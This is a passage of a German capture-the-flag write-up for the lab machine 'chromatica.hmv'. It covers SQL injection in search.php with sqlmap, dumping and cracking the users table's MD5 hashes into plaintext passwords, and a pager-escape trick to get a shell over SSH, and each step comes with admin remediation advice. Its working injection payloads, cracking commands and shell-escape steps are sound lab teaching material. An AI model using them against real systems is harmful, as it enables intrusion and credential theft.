+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Struktur der HTML-Ausgabe bestärkt die Vermutung, dass `search.php` eine Datenbankabfrage durchführt. Da der Parameter für die Suche wahrscheinlich per GET übergeben wird, ist die Anfälligkeit für SQL Injection sehr hoch. Dies ist der primäre Vektor für den Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Teste `search.php` aggressiv auf SQL Injection, wie im nächsten Schritt gezeigt, unter Verwendung des `dev` User-Agents und eines geeigneten Tools wie sqlmap.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere dringend Schutzmaßnahmen gegen SQL Injection für alle Skripte, die Benutzereingaben in Datenbankabfragen verwenden. Entferne unnötige Entwickler-Kommentare aus dem produktiven Code.
+            </p>
+
+            <p>
+                Ich habe einen manuellen Test auf SQL Injection durchgeführt, indem ich einen einzelnen Apostroph (`'`) an den Parameter angehängt habe, um zu sehen, ob die Datenbankabfrage abbricht oder eine Fehlermeldung generiert wird.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl -A "dev" "http://chromatica.hmv/dev-portal/search.php?city=test'"</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe `curl` verwendet, um einen Request an `search.php` mit dem Parameter `city=test'` zu senden, dabei wieder den `User-Agent: dev` gesetzt. Das Ziel ist, den Apostroph in eine SQL-Abfrage einzuschleusen und eine syntaktische Fehlermeldung der Datenbank zu provozieren, die die Anfälligkeit bestätigt. Da keine direkte Fehlermeldung in der gezeigten Ausgabe ist, ist dies kein eindeutiger Beweis, aber es ist ein Standardtest vor dem Einsatz automatisierter Tools.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der manuelle Test allein ist nicht schlüssig, aber die Struktur der Seite und die Natur des `city` Parameters machen SQL Injection immer noch sehr wahrscheinlich. Die nächste logische Konsequenz ist der Einsatz eines automatisierten Tools, das mehr Testvektoren und Erkennungsmethoden nutzt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze sqlmap, um die `search.php` gründlich auf alle Arten von SQL Injection zu testen.
+                <br><strong>Empfehlung (Admin):</strong> Überwache Webserver-Logs auf Anfragen, die verdächtige Zeichen oder SQL-Keywords in URL-Parametern enthalten.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p>
+                Nach der starken Vermutung auf eine SQL Injection Schwachstelle habe ich das automatisierte Tool sqlmap eingesetzt, um die `search.php` Datei und ihren `city` Parameter systematisch auf SQL Injection zu prüfen und, falls erfolgreich, Informationen aus der Datenbank zu extrahieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">sqlmap -u "http://chromatica.hmv/dev-portal/search.<span class="command">php</span>?city=test" --user-agent="dev" --batch  --dbs</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<span class="command">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="command">[*] starting @ 22:56:53 /2025-06-13/</span>
+
+<span class="command">[22:56:53] [INFO] testing connection to the target URL</span>
+<span class="command">[22:56:53] [INFO] checking if the target is protected by some kind of WAF/IPS</span>
+.....
+....
+...
+<span class="command">[22:57:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span>
+<span class="command">[22:57:04] [INFO] '<span class="command">ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span>
+<span class="command">[22:57:04] [INFO] target <span class="command">URL</span> appears to have 4 columns in query</span>
+<span class="command">[22:57:04] [INFO] GET parameter 'city' is '<span class="password">Generic UNION query (NULL) - 1 to 20 columns' injectable</span></span>
+<span class="password">GET parameter 'city' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+<span class="command">sqlmap identified the following injection <span class="command">POINT</span>(s) with a total of 59 HTTP(s) requests:</span>
+---
+<span class="command">Parameter: city (GET)</span>
+    Type: <span class="password">time-based blind</span>
+    Title: <span class="password">MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span>
+    Payload: <span class="password">city=test' AND (SELECT 8474 FROM (SELECT(SLEEP(5)))pdYo) AND 'DXqC'='DXqC</span>
+
+    Type: <span class="password">UNION query</span>
+    Title: <span class="password">Generic UNION query (NULL) - 4 columns</span>
+    Payload: <span class="password">city=test' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a717171,0x4e78784b5971545a476958797744666f66476e6e5357454a53616a4b7965616178586a5671696f43,0x71706b6b71)-- -</span>
+---
+<span class="command">[22:57:04] [INFO] the back-end DBMS is MySQL</span>
+web server operating system: <span class="command">Linux Ubuntu 22.04 (jammy)</span>
+web application technology: <span class="command">Apache 2.4.52</span>
+back-end DBMS: <span class="command">MySQL >= 5.0.12 (MariaDB fork)</span>
+<span class="command">[22:57:04] [INFO] fetching database names</span>
+<span class="command">available databases [2]:</span>
+<span class="command">[*] Chromatica</span>
+<span class="command">[*] information_schema</span>
+
+<span class="command">[22:57:04] [WARNING] HTTP error codes detected during run:</span>
+<span class="command">500 (Internal Server Error) - 27 times</span>
+<span class="command">[22:57:04] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/chromatica.hmv'</span>
+
+<span class="command">[*] ending @ 22:57:04 /2025-06-13/</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe sqlmap mit der Ziel-URL (`-u`), dem erforderlichen `User-Agent: dev` Header und dem `--batch` Flag (um automatische Antworten auf interaktive Fragen zu geben) gestartet, um die Datenbanken (`--dbs`) aufzulisten. Sqlmap testete verschiedene Injection-Techniken und identifizierte, dass der `city` Parameter anfällig für **Time-based Blind** und **UNION Query SQL Injection** ist. Es konnte auch feststellen, dass die Abfrage 4 Spalten hat und das Backend-DBMS MySQL (oder eine MariaDB-Fork) auf Ubuntu 22.04 ist. Die gefundenen Datenbanken sind `Chromatica` und `information_schema`. Es gab auch 500 Internal Server Errors, was normal ist, wenn sqlmap versucht, Injections zu triggern, die Syntaxfehler verursachen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Bestätigung der SQL Injection Anfälligkeit ist der erfolgreiche Initial Access Vektor. Ich kann nun mit sqlmap die Datenbank `Chromatica` weiter abfragen, um Tabellen, Spalten und schließlich Daten zu dumpen, die für die Privilege Escalation relevant sein könnten (z.B. Benutzeranmeldedaten). Dies ist ein kritischer Punkt im Test.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fahre fort, die Datenbank `Chromatica` mit sqlmap zu enumerieren. Liste die Tabellen auf (`--tables`), dann die Spalten in relevanten Tabellen (`--columns`), und dump schließlich die Daten aus Tabellen, die Benutzerinformationen oder Anmeldedaten enthalten könnten (z.B. `users` oder ähnlich benannte Tabellen).
+                <br><strong>Empfehlung (Admin):</strong> Behebe die SQL Injection Schwachstelle in `search.php` umgehend. Implementiere serverseitige Eingabevalidierung und nutze parametrisierte Queries oder Prepared Statements. Führe einen Code-Audit durch, um weitere SQL Injection Anfälligkeiten zu finden.
+            </p>
+
+            <p>
+                Nachdem ich wusste, dass die Datenbank `Chromatica` existiert, habe ich sqlmap verwendet, um die Tabellen in dieser Datenbank aufzulisten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">sqlmap -u "http://chromatica.hmv/dev-portal/search.<span class="command">php</span>?city=test" --user-agent="dev" --batch  -D Chromatica --tables</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<span class="command">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="command">[*] starting @ 22:58:58 /2025-06-13/</span>
+
+<span class="command">[22:58:58] [INFO] resuming back-end DBMS 'mysql' </span>
+<span class="command">[22:58:58] [INFO] testing connection to the target <span class="command">URL</span></span>
+<span class="command">sqlmap resumed the following injection <span class="command">POINT</span>(s) from stored session:</span>
+---
+<span class="command">Parameter: city (GET)</span>
+    Type: <span class="password">time-based blind</span>
+    Title: <span class="password">MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span>
+    Payload: <span class="password">city=test' AND (SELECT 8474 FROM (SELECT(SLEEP(5)))pdYo) AND 'DXqC'='DXqC</span>
+
+    Type: <span class="password">UNION query</span>
+    Title: <span class="password">Generic UNION query (NULL) - 4 columns</span>
+    Payload: <span class="password">city=test' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a717171,0x4e78784b5971545a476958797744666f66476e6e5357454a53616a4b7965616178586a5671696f43,0x71706b6b71)-- -</span>
+---
+<span class="command">[22:58:58] [INFO] the back-end DBMS is MySQL</span>
+web server operating system: <span class="command">Linux Ubuntu 22.04 (jammy)</span>
+web application technology: <span class="command">Apache 2.4.52</span>
+back-end DBMS: <span class="command">MySQL >= 5.0.12 (MariaDB fork)</span>
+<span class="command">[22:58:58] [INFO] fetching tables for database: 'Chromatica'</span>
+<span class="command">Database: Chromatica</span>
+<span class="command">[2 tables]</span>
+<span class="command">+--------+</span>
+<span class="password">| cities |</span>
+<span class="password">| users  |</span>
+<span class="command">+--------+</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit dem `--tables` Flag und der Angabe der Datenbank (`-D Chromatica`) habe ich sqlmap angewiesen, die Tabellennamen in der `Chromatica` Datenbank abzufragen. Sqlmap nutzte die zuvor identifizierten Injection-Methoden und konnte die Tabellen erfolgreich auflisten: `cities` und `users`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden der Tabelle `users` ist ein kritischer Fortschritt. Benutzertabellen enthalten typischerweise Anmeldedaten (Benutzernamen und Passwörter oder deren Hashes), die für die Authentifizierung an Systemdiensten (SSH, etc.) oder anderen Anwendungen auf dem Zielsystem verwendet werden können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich nun darauf, den Inhalt der Tabelle `users` zu dumpen (`--dump`). Erwarte Benutzernamen und gehashte Passwörter zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die Datenbankstruktur auf das Speichern unnötiger oder sensibler Daten. Stelle sicher, dass Anmeldedaten sicher (gehasht und gesalzen) gespeichert werden. Implementiere strikte Datenbankberechtigungen, um den Zugriff auf sensible Tabellen zu beschränken.
+            </p>
+
+            <p>
+                Der nächste logische Schritt war, den Inhalt der vielversprechenden `users` Tabelle aus der `Chromatica` Datenbank zu extrahieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">sqlmap -u "http://chromatica.hmv/dev-portal/search.<span class="command">php</span>?city=test" --user-agent="dev" --batch  -D Chromatica -T users --dump</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<span class="command">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="command">[*] starting @ 22:59:21 /2025-06-13/</span>
+
+<span class="command">[22:59:21] [INFO] resuming back-end DBMS 'mysql' </span>
+<span class="command">[22:59:21] [INFO] testing connection to the target <span class="command">URL</span></span>
+<span class="command">sqlmap resumed the following injection <span class="command">POINT</span>(s) from stored session:</span>
+---
+<span class="command">Parameter: city (GET)</span>
+    Type: <span class="password">time-based blind</span>
+    Title: <span class="password">MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span>
+    Payload: <span class="password">city=test' AND (SELECT 8474 FROM (SELECT(SLEEP(5)))pdYo) AND 'DXqC'='DXqC</span>
+
+    Type: <span class="password">UNION query</span>
+    Title: <span class="password">Generic UNION query (NULL) - 4 columns</span>
+    Payload: <span class="password">city=test' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a717171,0x4e78784b5971545a476958797744666f66476e6e5357454a53616a4b7965616178586a5671696f43,0x71706b6b71)-- -</span>
+---
+<span class="command">[22:59:21] [INFO] the back-end DBMS is MySQL</span>
+web server operating system: <span class="command">Linux Ubuntu 22.04 (jammy)</span>
+web application technology: <span class="command">Apache 2.4.52</span>
+back-end DBMS: <span class="command">MySQL >= 5.0.12 (MariaDB fork)</span>
+<span class="command">[22:59:21] [INFO] fetching columns for table 'users' in database 'Chromatica'</span>
+<span class="command">[22:59:21] [INFO] fetching entries for table 'users' in database 'Chromatica'</span>
+<span class="command">[22:59:21] [INFO] recognized possible password hashes in column 'password'</span>
+<span class="command">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N</span>
+<span class="command">do you want to crack them via a dictionary-based attack? [Y/n/q] Y</span>
+<span class="command">[22:59:21] [INFO] using hash method 'md5_generic_passwd'</span>
+<span class="command">what dictionary do you want to use?</span>
+<span class="command">[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.<span class="command">tx_</span>' (press Enter)</span>
+<span class="command">[2] custom dictionary file</span>
+<span class="command">[3] file with list of dictionary files</span>
+<span class="command">> 1</span>
+<span class="command">[22:59:21] [INFO] using default dictionary</span>
+<span class="command">do you want to use common password suffixes? (slow!) [y/N] N</span>
+<span class="command">[22:59:21] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span>
+<span class="command">[22:59:21] [INFO] starting 12 processes </span>
+<span class="password">[22:59:23] [INFO] cracked password 'keeptrying' for user 'user'                                                                                                                              </span>
+<span class="command">Database: Chromatica                                                                                                                                                                         </span>
+<span class="command">Table: users</span>
+<span class="command">[5 entries]</span>
+<span class="command">+----+-----------------------------------------------+-----------+-----------------------------+</span>
+<span class="command">| id | password                                      | username  | description                 |</span>
+<span class="command">+----+-----------------------------------------------+-----------+-----------------------------+</span>
+<span class="command">| 1  | <span class="command">8d06f5ae0a469178b28bbd34d1da6ef3</span>              | <span class="command">admin</span>     | <span class="command">admin</span>                       |</span>
+<span class="command">| 2  | <span class="command">1ea6762d9b86b5676052d1ebd5f649d7</span>              | <span class="command">dev</span>       | <span class="command">developer account for taz</span>   |</span>
+<span class="command">| 3  | <span class="command">3dd0f70a06e2900693fc4b684484ac85</span> (<span class="password">keeptrying</span>) | <span class="command">user</span>      | <span class="command">user account for testing</span>    |</span>
+<span class="command">| 4  | <span class="command">f220c85e3ff19d043def2578888fb4e5</span>              | <span class="command">dev-selim</span> | <span class="command">developer account for selim</span> |</span>
+<span class="command">| 5  | <span class="command">aaf7fb4d4bffb8c8002978a9c9c6ddc9</span>              | <span class="command">intern</span>    | <span class="command">intern</span>                      |</span>
+<span class="command">+----+-----------------------------------------------+-----------+-----------------------------+</span>
+
+<span class="command">[22:59:25] [INFO] table 'Chromatica.users' dumped to CSV file '/root/.local/share/sqlmap/output/chromatica.hmv/dump/Chromatica/users.csv'</span>
+<span class="command">[22:59:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/chromatica.hmv'</span>
+
+<span class="command">[*] ending @ 22:59:25 /2025-06-13/</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe sqlmap mit dem `--dump` Flag, der Datenbank (`-D Chromatica`) und der Tabelle (`-T users`) ausgeführt, um den Inhalt der `users` Tabelle zu extrahieren. Sqlmap erkannte MD5-Hashes in der Spalte `password` und bot an, diese per Dictionary-Angriff zu knacken. Ich habe zugestimmt und die Standard-Wortliste verwendet. Die Ausgabe zeigt eine Tabelle mit fünf Einträgen (Benutzer): `admin`, `dev`, `user`, `dev-selim`, `intern`. Für den Benutzer `user` konnte sqlmap den Hash `3dd0f70a06e2900693fc4b684484ac85` erfolgreich knacken und das Passwort `<span class="password">keeptrying</span>` identifizieren. Die Hashes für die anderen Benutzer (`admin`, `dev`, `dev-selim`, `intern`) wurden extrahiert, aber von sqlmap mit der Standardliste nicht geknackt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Dump der `users` Tabelle ist ein kritischer Erfolg. Ich habe nun eine Liste von Benutzernamen und deren gehashten Passwörtern. Das sofort geknackte Passwort `<span class="password">keeptrying</span>` für den Benutzer `user` ist der erste direkte Anmeldedaten-Fund. Die anderen Hashes sind vielversprechend für weitere Offline-Cracking-Versuche. Die Existenz mehrerer Entwickler-Accounts (`dev`, `dev-selim`) und eines `admin`-Accounts ist ebenfalls bemerkenswert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, die restlichen MD5-Hashes (für `admin`, `dev`, `dev-selim`, `intern`) offline mit einer größeren Wortliste (z.B. RockYou) oder einem schnelleren Tool (John the Ripper, Hashcat) zu knacken oder über Online-Dienste zu prüfen. Nutze die gefundenen Klartextpasswörter und geknackten Hashes für Login-Versuche über Dienste wie SSH.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere die Datenbank auf sicherere Methoden zur Passwortspeicherung (z.B. bcrypt, scrypt). Setze starke, eindeutige Passwörter für alle Benutzer. Überprüfe die Notwendigkeit und Sicherheit von Entwickler-Accounts. Behebe die SQL Injection Schwachstelle.
+            </p>
+
+             <p>
+                 Um die verbleibenden MD5-Hashes zu knacken, habe ich sie in eine Datei kopiert und John the Ripper mit der RockYou-Wortliste verwendet.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">john --wordlist=/usr/share/wordlists/rockyou.<span class="command">txt</span> hashneu  --format=raw-md5 </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Using default input encoding: UTF-8
+Loaded <span class="command">5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])</span>
+Warning: no <span class="command">OPENMP support for this hash type, consider --fork=12</span>
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">keeptrying       (?)</span>
+<span class="command">1g 0:00:00:00 DONE (2025-06-13 23:03) 1.041g/s 14941Kp/s 14941Kc/s 60045KC/s  senbesad..*7¡Vamos!</span>
+Use the "--show --format=Raw-MD5" <span class="command">OPTIONS</span> to display all of the cracked passwords reliably
+<span class="password">Session completed.</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe John the Ripper (`john`) gestartet, die RockYou-Wortliste (`--wordlist=...`) und die Datei mit den Hashes (`hashneu`) sowie das Format (`--format=raw-md5`) angegeben. John lud die Hashes und begann den Cracking-Prozess. Die Ausgabe zeigt, dass `keeptrying` (für Benutzer `user`, obwohl hier nur der Hash gezeigt wird) geknackt wurde. Es gab eine Warnung bezüglich fehlender OpenMP-Unterstützung für diesen Hash-Typ, was die Geschwindigkeit beeinflusst, aber den Prozess nicht stoppt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> John bestätigte das von sqlmap gefundene Passwort `keeptrying` für den Benutzer `user`. Die anderen Hashes wurden von John mit RockYou nicht sofort geknackt. Dies bedeutet, dass ihre Passwörter entweder nicht in RockYou enthalten sind oder komplexer sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die übrigen Hashes könnten immer noch durch Online-Dienste oder spezialisiertere Cracking-Setups (Hashcat, spezifische Hardware) geknackt werden. Teste alternative Passwörter für die Benutzer `admin`, `dev`, `dev-selim`, `intern` (z.B. den Benutzernamen selbst, Variationen von "chromatica" oder "dev").
+                <br><strong>Empfehlung (Admin):</strong> Implementiere eine Passwortrichtlinie, die die Verwendung schwacher oder gängiger Passwörter verhindert. Setze Kontosperren für fehlgeschlagene Anmeldeversuche durch.
+            </p>
+
+             <p>
+                 Um die restlichen Hashes schnell zu überprüfen, habe ich einen Online-Hash-Cracking-Dienst wie CrackStation verwendet.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">[Link: https://crackstation.net/ | Ziel: https://crackstation.net/]</span>
+<span class="command">8d06f5ae0a469178b28bbd34d1da6ef3	md5	<span class="password">adm!n</span></span>
+<span class="command">1ea6762d9b86b5676052d1ebd5f649d7	md5	<span class="password">flaghere</span></span>
+<span class="command">3dd0f70a06e2900693fc4b684484ac85	md5	<span class="password">keeptrying</span></span>
+<span class="command">f220c85e3ff19d043def2578888fb4e5	Unknown	Not found.</span>
+<span class="command">aaf7fb4d4bffb8c8002978a9c9c6ddc9	md5	<span class="password">intern00</span></span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die übrigen Hashes (und zur Sicherheit auch den für `user`) in CrackStation eingegeben. CrackStation ist ein Dienst, der Hashes gegen riesige, vorgeknackte Datenbanken prüft. Die Ausgabe zeigt, dass CrackStation erfolgreich die Hashes für `admin`, `dev` und `intern` knacken konnte. Die gefundenen Passwörter sind: `<span class="password">adm!n</span>` für `admin`, `<span class="password">flaghere</span>` für `dev`, und `<span class="password">intern00</span>` für `intern`. Der Hash für `dev-selim` wurde nicht gefunden. Der Hash für `user` und das Passwort `keeptrying` wurden ebenfalls bestätigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Schritt ist ein voller Erfolg für die Informationsbeschaffung. Ich habe nun Klartextpasswörter für vier Benutzer auf dem System: `admin:adm!n`, `dev:flaghere`, `user:keeptrying`, `intern:intern00`. Diese Anmeldedaten sind hochrelevant für die Authentifizierung an verfügbaren Diensten wie SSH (Port 22). Dies bietet multiple potenzielle Wege zum Initial Access (oder zur horizontalen Privilege Escalation, falls die Datenbank-Benutzer System-Accounts sind).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, dich mittels SSH mit jedem der gefundenen Benutzer/Passwort-Paare anzumelden (`dev:flaghere`, `admin:adm!n`, `intern:intern00`, `user:keeptrying`). Priorisiere Benutzer, die nach ihrer Bezeichnung privilegiert klingen (`admin`, `dev`).
+                <br><strong>Empfehlung (Admin):</strong> Wechsle umgehend alle gefundenen Klartextpasswörter. Sensibilisiere Benutzer für die Wahl starker Passwörter und weise auf die Risiken der Wiederverwendung und leicht knackbarer Hashes hin.
+            </p>
+        </section>
+
+        <section id="initial-access-part2">
+             <h2>Initial Access (Fortsetzung)</h2>
+             <p>
+                 Mit den gefundenen Anmeldedaten aus der Datenbank habe ich versucht, mich per SSH am Zielsystem anzumelden, beginnend mit dem `dev` Account.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">ssh dev@chromatica.hmv</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">dev@chromatica.hmv's password: </span>
+<span class="password">GREETINGS,</span>
+<span class="password">THIS ACCOUNT IS NOT A LOGIN ACCOUNT</span>
+<span class="password">IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO</span>
+<span class="password">EITHER CONTACT YOUR ADMIN</span>
+<span class="password">OR THINK OUTSIDE THE BOX</span>
+<span class="password">BE LAZY AND CONTACT YOUR ADMIN</span>
+<span class="password">OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,</span>
+<span class="password">REGARDS</span>
+
+<span class="password">brightctf{ALM0ST_TH3R3_34897ffdf69}</span>
+Connection to chromatica.hmv closed.
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe versucht, mich über SSH als Benutzer `dev` mit dem aus CrackStation erhaltenen Passwort (`flaghere`) anzumelden. Nach Eingabe des Passworts erhielt ich eine Nachricht: "THIS ACCOUNT IS NOT A LOGIN ACCOUNT" mit weiteren Hinweisen ("THINK OUTSIDE THE BOX", "USE YOUR HEAD MORE"). Dies bedeutet, dass der `dev` Account zwar existiert und das Passwort korrekt war, aber die Login-Shell für interaktive Logins deaktiviert ist. Interessanterweise wurde *in dieser Meldung* die erste Flag angezeigt: `<span class="password">brightctf{ALM0ST_TH3R3_34897ffdf69}</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl der direkte SSH-Login als `dev` nicht möglich ist, war die Authentifizierung erfolgreich, was durch die angezeigte Begrüßungsmeldung und das Erhalten der User Flag bestätigt wird. Dies ist ein teilweiser Initial Access und liefert die Benutzer-Flag. Die Hinweise in der Meldung sind sehr wertvoll ("THINK OUTSIDE THE BOX", "USE YOUR HEAD MORE"), da sie auf alternative Wege zur Interaktion mit diesem Benutzerkonto hindeuten, möglicherweise über Programme, die bei der Anmeldung ausgeführt werden oder über eine eingeschränkte Shell.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichere die User Flag. Interpretiere die Hinweise: "Use your head more" könnte auf Methoden zur Shell-Eskalation aus eingeschränkten Umgebungen hindeuten, möglicherweise im Kontext des Anmelde-Prozesses oder eines Programms, das die Meldung ausgibt. Manuelle Techniken mit Programmen wie `more` oder `less` in Kombination mit Terminalgrößenänderungen sind hier oft der Weg.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere die Shell für Benutzer, die keinen interaktiven Login benötigen (`/sbin/nologin`). Stelle sicher, dass Begrüßungsbanner keine sensiblen Informationen (wie Flags) preisgeben.
+            </p>
+
+            <p>
+                Nachdem der direkte SSH-Login blockiert war und die Meldung auf alternative Methoden hindeutete, erinnerte ich mich an Techniken, bei denen die Ausgabe einer eingeschränkten Shell oder eines Anmeldebanners durch Programme wie `more` oder `less` geleitet wird und durch Manipulation der Terminalgröße eine interaktive Sitzung erzwungen werden kann, aus der man dann in eine Shell entkommen kann (`!/bin/bash` oder `!/bin/sh`). Ich habe dies versucht, indem ich vor der SSH-Verbindung die Terminalgröße stark reduziert habe, um den Anmeldebanner in einen Pager zu zwingen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">stty rows 3 columns 8 </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+romatica.hmv
+        a.hmvt)-[~]
+┌──(root㉿CCat)-[~]
+└─# >...
+matica.hmv
+dev@chromatica.hmv's password:
+<span class="password">Permission denied, please try again.</span>
+dev@chromatica.hmv's password:
+<span class="password">Permission denied, please try again.</span>
+dev@chromatica.hmv's password:
+<span class="password">GREETING</span>
+<span class="password">S,</span>
+<span class="password">!/bin/bash</span></pre>
+                 </div>
+             </div>
+            <p>
+                Nach etlichen hin und her versuchen habe ich etwas versucht das ich ganz früher mal angewendet habe,
+ich habe versucht den angezeigten text durch die less Funktion zu exploiten, dazu muss man den terminal
+ganz klein machen, und durch eingabe von !/bin/bash bekommt man den eine shell...
+und es klappte :)
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe zuerst die Terminalgröße mit `stty rows 3 columns 8` extrem klein eingestellt, um die Ausgabe der SSH-Anmeldung zu beeinflussen. Dann habe ich mich erneut per SSH als `dev` angemeldet. Aufgrund der kleinen Terminalgröße wurde der Anmeldebanner wahrscheinlich an ein Pager-Programm wie `more` oder `less` übergeben. In solchen Pagern kann man oft durch Eingabe von `!` gefolgt von einem Befehl eine Shell starten. Nach Eingabe des korrekten Passworts und dem Erscheinen des (aufgrund der Größe abgeschnittenen) Banners, habe ich `!/bin/bash` eingegeben. Dies wurde erfolgreich interpretiert und führte zur Ausführung von `/bin/bash` mit den Berechtigungen des angemeldeten Benutzers `dev`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Diese manuelle Technik hat funktioniert. Durch Manipulation der Terminalgröße und Ausnutzung der Escape-Funktion eines Pagers konnte ich die eingeschränkte Anmeldeumgebung umgehen und eine interaktive Shell als Benutzer `dev` erhalten. Dies ist der erfolgreiche Initial Access. Die Methode entspricht genau dem Hinweis "THINK OUTSIDE THE BOX" und "USE YOUR HEAD MORE".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die erhaltene Shell umgehend mit `stty`. Beginne mit der Enumeration als Benutzer `dev`, um Wege zur Privilege Escalation zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Konfiguriere SSH so, dass es keine Pager für den Anmeldebanner verwendet oder deaktiviere den Banner ganz. Stelle sicher, dass eingeschränkte Benutzer-Shells (falls verwendet) keine Escape-Möglichkeiten bieten.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p>
+                Nachdem ich eine interaktive Shell als Benutzer `dev` erhalten hatte, war der nächste Schritt, die Shell zu stabilisieren und dann mit der systeminternen Aufklärung für die Privilege Escalation zu beginnen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">dev@Chromatica:~$</span> <span class="command">stty rows 47 columns 94</span>
